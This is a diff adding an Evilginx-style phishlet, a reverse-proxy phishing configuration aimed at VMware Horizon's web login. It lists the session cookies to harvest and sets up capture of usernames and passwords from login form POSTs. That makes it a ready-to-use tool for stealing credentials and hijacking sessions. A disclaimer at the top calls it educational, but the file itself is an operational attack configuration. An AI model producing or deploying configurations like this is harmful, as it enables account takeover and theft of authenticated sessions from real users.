@@ -1,0 +1,27 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@playswithfir3'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'my-horizon', orig_sub: 'my-horizon', domain: 'vmware.com', session: true, is_landing: true, auto_filter: true}
+
+sub_filters: []
+
+auth_tokens:
+  - domain: 'vmware.com'
+    keys: ['CID', 'JSESSIONID','JSESSIONIDHTMLACCESS','sessionDataServiceId','TCAT4vmware.com(.*),regexp']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'my-horizon.vmware.com'
+  path: '/portal/webclient/index.html'
